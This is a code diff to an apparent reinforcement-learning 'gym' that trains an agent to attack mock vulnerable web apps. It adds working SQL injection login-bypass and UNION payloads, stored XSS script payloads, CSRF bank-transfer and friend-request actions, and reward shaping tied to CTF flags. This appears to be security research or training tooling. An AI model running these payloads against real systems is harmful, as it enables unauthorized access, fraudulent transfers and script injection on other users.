@@ -241,7 +241,7 @@ class WebSecurityGym(gym.Env):
             64: self.attack_sqli_blind_boolean,  # Blind boolean SQLi
             65: self.attack_sqli_time_based,  # Time-based SQLi
             # XSS Attacks (66-75)
-            66: self.attack_xss_stored_posts,  # Stored XSS in posts
+            66: self.attack_smart_xss_stored,  # Stored XSS (Context-Aware: Posts/Transfer)
             67: self.attack_xss_stored_comments,  # Stored XSS in comments
             68: self.attack_xss_stored_messages,  # Stored XSS in messages
             69: self.attack_xss_stored_profile,  # Stored XSS in profiles
@@ -260,7 +260,7 @@ class WebSecurityGym(gym.Env):
             81: self.attack_path_traversal_null,  # Null byte bypass
             # CSRF & Request Forgery (82-85)
             82: self.attack_csrf_money_transfer,  # Banking transfer CSRF
-            83: self.attack_csrf_friend_request,  # Social media friend CSRF
+            83: self.attack_smart_csrf,  # CSRF (Context-Aware: Friend Req/Transfer)
             84: self.attack_csrf_post_creation,  # Post creation CSRF
             85: self.attack_csrf_profile_update,  # Profile update CSRF
             # Injection & Template Attacks (86-89)
@@ -398,7 +398,7 @@ class WebSecurityGym(gym.Env):
                 39: 79,  # Path Traversal
                 40: 149,  # Insecure Deserialization
                 41: 86,  # SSTI
-                42: 82,  # CSRF (bank transfer path)
+                42: 83,  # CSRF (Smart wrapper)
                 # LOGIC
                 43: 91,  # Negative Quantity (E-Commerce)
                 # ADVANCED AUTH
@@ -767,7 +767,17 @@ class WebSecurityGym(gym.Env):
         for url in self.discovered_endpoints:
             if any(k in url.lower() for k in keywords):
                 return url
-        return f"{self.target_url}{default_path}"
+
+        try:
+            parsed = urlparse(self.target_url)
+            if parsed.scheme and parsed.netloc:
+                base_url = f"{parsed.scheme}://{parsed.netloc}"
+            else:
+                base_url = self.target_url.rstrip("/")
+        except Exception:
+            base_url = self.target_url.rstrip("/")
+
+        return f"{base_url}{default_path}"
 
     # ============================================================================
     # TUNED ACTION IMPLEMENTATIONS - Optimized for Mockup Site Vulnerabilities
@@ -1208,37 +1218,86 @@ class WebSecurityGym(gym.Env):
     def attack_sqli_login_bypass(self):
         """SQL Injection: Login bypass."""
         sqli_payloads = ["admin' --", "' OR '1'='1' --"]
+        login_endpoints = [
+            ("/api/login", "json"),
+            ("/api/auth/login", "json"),
+            ("/login", "form"),
+        ]
+
         for payload in sqli_payloads:
-            try:
-                response = self.session.post(
-                    f"{self.target_url}/api/login",
-                    json={"username": payload, "password": "anything"},
-                    timeout=self.timeout,
-                )
-                if response.status_code == 200:
-                    reward = self._update_state_from_response(
-                        response, "sqli_login_success"
+            for endpoint, mode in login_endpoints:
+                try:
+                    url = f"{self.target_url}{endpoint}"
+                    if mode == "json":
+                        response = self.session.post(
+                            url,
+                            json={"username": payload, "password": "anything"},
+                            timeout=self.timeout,
+                        )
+                    else:
+                        response = self.session.post(
+                            url,
+                            data={"username": payload, "password": "anything"},
+                            timeout=self.timeout,
+                        )
+
+                    text_l = (response.text or "").lower()
+                    header_l = response.headers.get("X-Vuln-Confirmed", "").lower()
+                    confirmed = (
+                        "sqli" in header_l
+                        or "sql" in text_l
+                        and ("error" in text_l or "syntax" in text_l)
                     )
-                    return response, reward
-            except:
-                continue
+
+                    if confirmed and response.status_code in (200, 201, 302, 401, 500):
+                        reward = self._update_state_from_response(
+                            response, "sqli_login_success"
+                        )
+                        return response, reward
+                except Exception:
+                    continue
+
         return self._update_state_error()
 
     def attack_sqli_search_injection(self):
         """SQL Injection: Search box injection."""
-        try:
-            # Fix: Use correct number of columns for E-Commerce app (7 columns)
-            payload = "' UNION SELECT id,name,description,price,stock,category,image_url FROM products --"
-            response = self.session.get(
-                f"{self.target_url}/api/products?search={payload}", timeout=self.timeout
-            )
-            if response.status_code == 200:
-                reward = self._update_state_from_response(
-                    response, "sqli_search_success"
-                )
-                return response, reward
-        except:
-            pass
+        payloads = [
+            "' UNION SELECT id,name,description,price,stock,category,image_url FROM products --",
+            "' OR '1'='1' --",
+            "' OR 1=1 --",
+        ]
+        search_targets = [
+            ("/api/products", "search"),
+            ("/search", "q"),
+            ("/api/search", "q"),
+            ("/products", "search"),
+        ]
+
+        for payload in payloads:
+            for endpoint, param in search_targets:
+                try:
+                    response = self.session.get(
+                        f"{self.target_url}{endpoint}",
+                        params={param: payload},
+                        timeout=self.timeout,
+                    )
+
+                    text_l = (response.text or "").lower()
+                    header_l = response.headers.get("X-Vuln-Confirmed", "").lower()
+                    confirmed = (
+                        "sqli" in header_l
+                        or "sql" in text_l
+                        and ("error" in text_l or "syntax" in text_l)
+                    )
+
+                    if confirmed and response.status_code in (200, 500):
+                        reward = self._update_state_from_response(
+                            response, "sqli_search_success"
+                        )
+                        return response, reward
+                except Exception:
+                    continue
+
         return self._update_state_error()
 
     def attack_xss_stored_posts(self):
@@ -1807,7 +1866,7 @@ class WebSecurityGym(gym.Env):
         for url in candidates:
             try:
                 r = self.session.get(url, timeout=3)
-                if r.status_code != 404:
+                if r.status_code in (200, 201, 202, 302):
                     reward = self._calculate_reward(r, "BAC_API")
                     return r, reward
             except Exception:
@@ -1952,14 +2011,17 @@ class WebSecurityGym(gym.Env):
         if self.auth_token and self.auth_token != "SESSION":
             headers["Authorization"] = f"Bearer {self.auth_token}"
 
+        api_posts_url = self._find_best_url(["api/posts", "posts"], "/api/posts")
+        new_post_url = self._find_best_url(["new-post", "post/new"], "/new-post")
+
         post_attempts = [
             (
-                f"{self.target_url}/api/posts",
+                api_posts_url,
                 {"title": "Hacked", "content": payload},
                 "json",
             ),
             (
-                f"{self.target_url}/new-post",
+                new_post_url,
                 {"title": "Hacked", "content": payload},
                 "form",
             ),
@@ -1972,10 +2034,42 @@ class WebSecurityGym(gym.Env):
                 else:
                     r = self.session.post(url, data=data, headers=headers, timeout=3)
 
-                if r.status_code != 404:
-                    return r, self._calculate_reward(r, "XSS_STORED")
+                if r.status_code in (200, 201, 202, 302):
+                    reward = self._calculate_reward(r, "XSS_STORED")
+                    if reward < 1.0:
+                        for verify_url in [
+                            f"{self.target_url}/",
+                            f"{self.target_url}/post/1",
+                            f"{self.target_url}/posts",
+                        ]:
+                            try:
+                                verify_r = self.session.get(verify_url, timeout=3)
+                                verify_reward = self._calculate_reward(
+                                    verify_r, "XSS_STORED"
+                                )
+                                if verify_reward > reward:
+                                    r, reward = verify_r, verify_reward
+                                    if reward >= 1.0:
+                                        break
+                            except Exception:
+                                continue
+                    return r, reward
             except Exception:
                 continue
+
+        # FileShare fallback: try stored XSS via upload description field
+        try:
+            upload_url = self._find_best_url(["upload", "api/upload"], "/upload")
+            upload_r = self.session.post(
+                upload_url,
+                data={"description": payload},
+                files={"file": ("xss_probe.txt", b"xss-probe", "text/plain")},
+                timeout=3,
+            )
+            if upload_r.status_code != 404:
+                return upload_r, self._calculate_reward(upload_r, "XSS_STORED")
+        except Exception:
+            pass
 
         return self._update_state_error()
 
@@ -2011,7 +2105,25 @@ class WebSecurityGym(gym.Env):
                     r = self.session.post(url, data=data, headers=headers, timeout=3)
 
                 if r.status_code != 404:
-                    return r, self._calculate_reward(r, "XSS_STORED")
+                    reward = self._calculate_reward(r, "XSS_STORED")
+                    if reward < 1.0:
+                        for verify_url in [
+                            f"{self.target_url}/",
+                            f"{self.target_url}/post/1",
+                            f"{self.target_url}/posts",
+                        ]:
+                            try:
+                                verify_r = self.session.get(verify_url, timeout=3)
+                                verify_reward = self._calculate_reward(
+                                    verify_r, "XSS_STORED"
+                                )
+                                if verify_reward > reward:
+                                    r, reward = verify_r, verify_reward
+                                    if reward >= 1.0:
+                                        break
+                            except Exception:
+                                continue
+                    return r, reward
             except Exception:
                 continue
 
@@ -2412,7 +2524,18 @@ class WebSecurityGym(gym.Env):
             self.last_vuln_type = response.headers.get("X-Vuln-Confirmed", "confirmed")
             if response.headers.get("X-CTF-Flag"):
                 self.found_sensitive_data = 1
-            return VULNERABILITY_REWARD
+
+            confirmed_id = self.last_vuln_type.lower()
+            reward = VULNERABILITY_REWARD
+
+            # Prioritize learning for hard-to-hit paths (banking XSS/CSRF)
+            if "xss" in confirmed_id or "csrf" in confirmed_id:
+                reward += 0.75
+
+            if response.headers.get("X-CTF-Flag") or "CTF{" in (response.text or ""):
+                reward += min(CTF_FLAG_REWARD, 1.0)
+
+            return reward
 
         reward = 0.0
 
@@ -2472,6 +2595,14 @@ class WebSecurityGym(gym.Env):
                 "<script>alert(1)</script>",
                 "onerror=alert(1)",
                 "alert(1)",
+            ],
+            "XSS_STORED": [
+                "stored_xss_viewed",
+                "xss_stored",
+                "<script",
+                "onerror=",
+                "javascript:",
+                "alert(",
             ],
             "BAC_API": [
                 "DB_LEAK_SUCCESS",
@@ -2597,6 +2728,17 @@ class WebSecurityGym(gym.Env):
                     reward = 0.001
 
                 break
+
+        # Near-hit shaping for online fine-tuning without full retraining
+        text_l = (response.text or "").lower()
+        if vuln_type in ("XSS", "CSRF") and response.status_code in (200, 302):
+            if (
+                "xss detected" in text_l
+                or "csrf" in text_l
+                or "transfer successful" in text_l
+                or "protection_bypassed" in text_l
+            ):
+                reward += 0.25
 
         return reward
 
@@ -3003,6 +3145,105 @@ class WebSecurityGym(gym.Env):
         ]
         return any(sig in response.text for sig in signatures)
 
+    # =========================================================================
+    # CONTEXT-AWARE "SMART" ACTIONS (Action Space Optimization)
+    # =========================================================================
+    
+    def attack_smart_csrf(self):
+        """Context-Aware CSRF: Dispatches to Banking Transfer or Social Friend Request."""
+        if self.app_tag == "banking":
+            return self.attack_csrf_money_transfer()
+        return self.attack_csrf_friend_request()
+
+    def attack_smart_xss_stored(self):
+        """Context-Aware Stored XSS: Dispatches to Banking Transfer or Social Posts."""
+        if self.app_tag == "banking":
+            return self.attack_xss_transfer()
+        return self.attack_xss_stored_posts()
+
+    # --- Underlying Implementations ---
+
+    def attack_csrf_money_transfer(self):
+        """CSRF: Banking Transfer (Port 5004)."""
+        try:
+            self.action_login_valid()
+            target = f"{self.target_url.rstrip('/')}/transfer"
+            payload = {
+                "to_account": "1002",
+                "amount": "10",
+                "description": "csrf_attack",
+            }
+            r = self.session.post(target, data=payload, timeout=self.timeout)
+            reward = self._calculate_reward(r, "CSRF")
+            return r, reward
+        except Exception:
+            return self._update_state_error()
+
+    def attack_xss_transfer(self):
+        """XSS: Banking Transfer Description (Port 5004)."""
+        try:
+            self.action_login_valid()
+            target = f"{self.target_url.rstrip('/')}/transfer"
+            xss_payload = "<script>alert('XSS')</script>"
+            payload = {
+                "to_account": "1002",
+                "amount": "10",
+                "description": xss_payload,
+            }
+            r = self.session.post(target, data=payload, timeout=self.timeout)
+            reward = self._calculate_reward(r, "XSS")
+            return r, reward
+        except Exception:
+            return self._update_state_error()
+
+    def attack_csrf_friend_request(self):
+        """CSRF: Social Friend Request (Port 5003)."""
+        try:
+            target = f"{self.target_url.rstrip('/')}/api/friends/add"
+            r = self.session.post(target, json={"friend_id": 1}, timeout=self.timeout)
+            reward = self._calculate_reward(r, "CSRF")
+            return r, reward
+        except Exception:
+            return self._update_state_error()
+            
+    def attack_xss_stored_posts(self):
+        """Context-aware stored XSS for social/blog/fileshare targets."""
+        try:
+            self.action_login_valid()
+            payload = "<script>alert('XSS')</script>"
+
+            # Social / API-style post creation
+            api_posts = self._find_best_url(["api/posts", "posts"], "/api/posts")
+            r = self.session.post(
+                api_posts,
+                json={"title": "Test Post", "content": payload},
+                timeout=self.timeout,
+            )
+            if r.status_code != 404:
+                return r, self._calculate_reward(r, "XSS_STORED")
+
+            # Blog form post creation
+            blog_new_post = self._find_best_url(["new-post", "post/new"], "/new-post")
+            r = self.session.post(
+                blog_new_post,
+                data={"title": "Test Post", "content": payload},
+                timeout=self.timeout,
+            )
+            if r.status_code != 404:
+                return r, self._calculate_reward(r, "XSS_STORED")
+
+            # FileShare upload description XSS
+            upload_url = self._find_best_url(["upload", "api/upload"], "/upload")
+            r = self.session.post(
+                upload_url,
+                data={"description": payload},
+                files={"file": ("xss_probe.txt", b"xss-probe", "text/plain")},
+                timeout=self.timeout,
+            )
+            return r, self._calculate_reward(r, "XSS_STORED")
+        except Exception:
+            return self._update_state_error()
+
     def _register_missing_actions(self):
         """Registers valid placeholders for missing attack methods."""
         missing_methods = [
@@ -3327,9 +3568,32 @@ class WebSecurityGym(gym.Env):
 
     def _safe_fallback_response(self, reason: str) -> requests.Response | None:
         """Return a safe response object when an action fails."""
+        base = self.target_url.rstrip("/")
+
+        # Prefer neutral endpoints that should not carry exploit flags.
+        for suffix in ("/api/health", "/health"):
+            try:
+                r = self.session.get(f"{base}{suffix}", timeout=self.timeout)
+                if r is not None and r.status_code < 500:
+                    return r
+            except Exception:
+                continue
+
+        # Last resort: base page, but sanitize flag artifacts to avoid false attributions.
         try:
-            url = f"{self.target_url.rstrip('/')}/"
-            return self.session.get(url, timeout=self.timeout)
+            r = self.session.get(f"{base}/", timeout=self.timeout)
+            if r is None:
+                return None
+
+            for header_name in ("X-Vuln-Confirmed", "X-CTF-Flag"):
+                if header_name in r.headers:
+                    del r.headers[header_name]
+
+            if r.text and "CTF{" in r.text:
+                cleaned = re.sub(r"CTF\{[^}]+\}", "CTF{REDACTED}", r.text)
+                r._content = cleaned.encode(r.encoding or "utf-8", errors="ignore")
+
+            return r
         except Exception:
             return None
 
